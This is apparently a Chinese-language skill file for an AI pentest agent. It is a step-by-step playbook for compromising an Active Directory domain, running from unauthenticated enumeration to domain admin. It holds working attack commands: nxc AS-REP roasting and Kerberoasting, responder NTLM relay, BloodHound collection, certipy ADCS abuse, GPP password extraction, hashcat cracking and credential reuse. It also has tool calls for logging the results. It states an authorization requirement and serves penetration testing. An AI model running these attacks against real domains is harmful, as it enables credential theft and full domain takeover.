---
name: active-directory-attack
description: 域环境打法——从无凭据到域管的路径选择（Kerberoast/AS-REP/ACL/委派/ADCS/凭据复用），含每类的最小验证动作与常见误判。
---

# 域环境（AD）攻击手册

**前提**：只有在内网可达、且本任务授权范围包含该域时才用。域操作噪音大、易触发告警，
每一步都先想清楚"这一步能拿到什么、失败了会不会打草惊蛇"。

## 0. 先画清楚环境（没有这一步，后面全是猜）

```
Bash: nxc smb {DC_IP} -u '' -p ''                       # 匿名/空会话、域信息、签名要求
Bash: nxc smb {CIDR} -u '' -p '' --shares               # 横向找可读共享
Bash: nmap -Pn -p 88,389,445,464,593,636,3268 {DC_IP} -sV
Bash: nxc ldap {DC_IP} -u '' -p '' --query "(objectClass=domain)" "*"
```
- 88/389 在 → 域控；445 开但 88/389 不在 → 成员机/工作组。
- `signing: False` 的主机是 NTLM relay 的候选。
- 拿到域名/FQDN 就用 `insert_assets` 登记 `subdomain` + `service(other: ldap/kerberos)`。

## 1. 无凭据阶段的四条正路

| 路径 | 判据 | 动作 | 最小验证 |
|---|---|---|---|
| **AS-REP Roasting** | 账号未要求预认证 | `nxc ldap {DC} -u users.txt -p '' --asreproast out.txt` | 拿到 `$krb5asrp...` 哈希并**离线破解出明文**才算确认 |
| **Kerberoasting** | 有 SPN 的服务账号 | `nxc ldap {DC} -u {user} -p {pass} --kerberoasting out.txt` | 同上，破解出明文才算确认 |
| **空会话/匿名 LDAP** | `ldap` 匿名可读 | 枚举 users/groups/computers | 能读出真实对象属性 |
| **NTLM Relay** | 目标不开 SMB 签名 | `responder -I eth0` + `nxc smb targets -u '' -p '' --gen-relay-list` | 中继成功并拿到会话 |

**注意**：抓到的哈希本身不是漏洞，是**线索**。`record_fact(confidence:inferred)`，
破解出明文后才能升级为 `capability:["creds"]`。

## 2. 有低权凭据之后

```
Bash: nxc smb {DC} -u {user} -p {pass} --users --groups --pass-pol
Bash: nxc smb {DC} -u {user} -p {pass} --shares -M spider_plus
Bash: bloodhound-python -u {user} -p {pass} -d {domain} -ns {DC} -c All
```
BloodHound 的产出**必须落到结论上**，否则等于没跑：把
"最短到 Domain Admin 的路径" 写成一条 `inferred` fact，路径上每一跳标出
"已具备/缺什么"——这就是 `capability-primitive-search` 的输入。

## 3. 提权/横向的六个高价值落点

| 落点 | 怎么发现 | 怎么验证 |
|---|---|---|
| **ACL 滥用**（GenericAll/WriteDACL/ForceChangePassword） | BloodHound `Outbound Object Control` | 实际改密码/加组成功 |
| **非约束委派** | `nxc ldap --query "(userAccountControl:1.2.840.113556.1.4.803:=524288)"` | 用 printerbug/ PetitPotam 触发回连并抓到 TGT |
| **约束委派 + 协议转换** | `msDS-AllowedToDelegateTo` | S4U2Self+S4U2Proxy 拿到目标服务票据 |
| **ADCS 模板配置错误**（ESC1/ESC4/ESC8） | `certipy find -u {user} -p {pass} -dc-ip {DC}` | 申请到**含目标身份**的证书并成功认证 |
| **GPP/cpassword** | `nxc smb --gpp-passwords` 或读 SYSVOL | 解出明文凭据 |
| **本地管理员复用** | 多机 `--local-auth` 试同一口令 | 成功登录第二台机器 |

每一跳成功后**立刻** `record_fact(capability:["creds"|"admin_access"])` —— 这会把
这些主机上被关掉的覆盖格子重新打开。

## 4. 常见误判（会浪费大量时间）

- `STATUS_LOGON_FAILURE` 和 `STATUS_ACCOUNT_LOCKED` 混为一谈 → 会把账号锁死，且结论错。
- 只因为 BloodHound 画出路径就报"可提权" → 路径存在 ≠ 你具备执行条件（很多边需要特定权限）。
- Kerberoast 拿到哈希就报 RCE → 未破解即无线索价值，只能标 inferred。
- ADCS 模板"看起来可配置"就报 ESC1 → 必须实际签发并认证成功。
- 同一口令在多台机器用 `--local-auth` 成功，被当成域管 → 那是本地管理员复用，影响面和修复建议完全不同。

## 5. 写回要求

```
record_fact(
  summary: "svc_backup 账号可 Kerberoast，且已破解出明文（域用户，非管理员）",
  detail:  "SPN: MSSQLSvc/db01.corp.local:1433
            破解方式: hashcat -m 13100 -a 0 out.txt rockyou.txt → 'Summer2023!'
            该账号在 BloodHound 中有一条 GenericAll → OU=Servers 的边（未验证是否可用）",
  evidence: "nxc ldap dc -u svc_backup -p 'Summer2023!' → [+] corp.local\\svc_backup:Pwn3d!",
  confidence: observed,
  capability: ["creds"],
  asset_ids: [dc_asset_id]
)
```
`capability` 一定要填——它是触发"重新评估旧否定结论"的开关。
